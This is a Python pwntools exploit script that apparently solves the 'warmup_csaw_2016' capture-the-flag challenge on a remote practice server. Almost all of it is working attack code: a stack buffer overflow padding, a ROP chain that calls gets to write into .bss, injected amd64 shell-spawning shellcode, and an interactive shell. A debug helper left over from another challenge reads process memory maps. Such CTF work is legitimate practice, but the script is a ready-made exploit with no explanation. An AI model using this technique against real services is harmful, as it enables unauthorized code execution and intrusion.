#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'mergeheap'
    interruptPoint=0
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFbase = 0
    libcBase = 0
    for inf in maps.readlines():
        if ELFbase == 0:
            if binaryname in inf:
                ELFbase = int(inf.split('-', 1)[0], 16)
        if libcBase == 0:
            if 'libc' in inf:
                libcBase = int(inf.split('-', 1)[0], 16)
    success('elfbase', ELFbase)
    if interruptPoint :
        success('interruptPoint', hex(interruptPoint+ELFbase))
    success('libcBase', libcBase)
    raw_input('debug>')

io = remote('node2.buuoj.cn.wetolink.com', 28094)
elf = ELF('./warmup_csaw_2016')
# io = process('./warmup_csaw_2016')
prdi = 0x0000000000400713

io.recvuntil('0x40060d\n>')
padding = 'a' * 0x40 + 'deadbeef'
payload = padding + p64(prdi) + p64(elf.bss())
payload += p64(elf.plt['gets']) + p64(0x400520)
io.sendline(payload)

context.arch = 'amd64'
shellcode = asm(shellcraft.amd64.sh())
io.sendline(shellcode)

payload = padding + p64(elf.bss())

io.sendline(payload)

io.interactive()
io.close()
